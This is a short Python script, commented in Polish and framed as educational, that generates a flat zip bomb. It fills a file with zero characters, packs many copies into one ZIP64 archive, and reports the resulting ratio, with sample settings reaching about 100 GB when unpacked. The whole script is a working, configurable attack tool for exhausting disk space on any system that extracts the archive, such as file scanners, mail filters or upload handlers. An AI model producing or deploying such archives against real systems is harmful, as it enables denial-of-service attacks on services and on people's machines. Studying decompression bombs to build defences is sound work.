#!/usr/bin/env python3
"""
Plaska (jednowarstwowa) zip bomba - generator do celow EDUKACYJNYCH.

UWAGA: uruchamiaj i rozpakowuj TYLKO w izolowanej maszynie wirtualnej.
Jedno rozpakowanie -> cala zawartosc rozwija sie OD RAZU (nie trzeba
wchodzic w zagnieżdzone warstwy jak w wersji rekurencyjnej).

Mechanizm:
  - tworzymy jeden duzy plik wypelniony zerami (kompresuje sie ~1000:1),
  - pakujemy jego N kopii do jednego archiwum,
  - po rozpakowaniu dysk dostaje N * rozmiar_pliku danych.

Uzycie:
  python3 zipbomb_flat.py [liczba_kopii] [rozmiar_kopii_MB] [plik_wyjsciowy]

Przyklady:
  python3 zipbomb_flat.py                 # domyslnie ~1 GB po rozpakowaniu (bezpieczny test)
  python3 zipbomb_flat.py 100 1000 bomb.zip   # ~100 GB po rozpakowaniu
"""
import os
import sys
import zipfile


def human(n):
    n = float(n)
    for unit in ["B", "KB", "MB", "GB", "TB"]:
        if n < 1024:
            return f"{n:.2f} {unit}"
        n /= 1024
    return f"{n:.2f} PB"


def build(out_path, copies, piece_mb):
    piece_bytes = piece_mb * 1024 * 1024
    one_mb = b"0" * (1024 * 1024)
    tmp = "payload.bin"

    # 1. jeden duzy plik samych zer (swietnie sie kompresuje)
    print(f"Tworze plik danych: {human(piece_bytes)} ...")
    with open(tmp, "wb") as f:
        for _ in range(piece_mb):
            f.write(one_mb)

    # 2. pakujemy N kopii do jednego .zip -> wszystko rozpakuje sie na raz
    print(f"Pakuje {copies} kopii do {out_path} ...")
    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
        for i in range(copies):
            zf.write(tmp, arcname=f"file-{i}.bin")

    os.remove(tmp)

    decompressed = copies * piece_bytes
    zsize = os.path.getsize(out_path)
    print("-" * 40)
    print(f"Plik .zip:        {human(zsize)}")
    print(f"Po rozpakowaniu:  {human(decompressed)}")
    print(f"Wspolczynnik:     {decompressed / zsize:.0f} : 1")
    print("-" * 40)
    print("Podejrzyj BEZ rozpakowywania:  unzip -l", out_path)


if __name__ == "__main__":
    copies = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    piece_mb = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    out = sys.argv[3] if len(sys.argv) > 3 else "bomb.zip"
    build(out, copies, piece_mb)
